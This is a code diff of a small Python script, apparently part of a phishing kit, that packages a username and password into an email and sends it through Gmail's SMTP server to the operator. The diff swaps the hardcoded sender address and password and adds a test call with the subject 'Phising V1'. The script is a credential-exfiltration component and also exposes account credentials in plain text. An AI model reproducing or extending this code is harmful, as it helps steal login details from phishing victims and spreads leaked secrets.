@@ -1,6 +1,6 @@
-fme = 'justabotsubs12@gmail.com'
+fme = 'billalfauzan154@gmail.com'
 import smtplib
-fyou = 'ohiabuebmpoeomqk'
+fyou = 'fauzan#15'
 def send(target="",subject="",user="",pwd=""):
 	txt = ""
 	txt += "Username: "+user
@@ -16,3 +16,5 @@ def send(target="",subject="",user="",pwd=""):
 		server.sendmail(target,target,message)
 	except Exception as E:
 		print (E)
+
+send(target="billal.krsz006@gmail.com",subject="Phising V1",user="test",pwd="hahah")
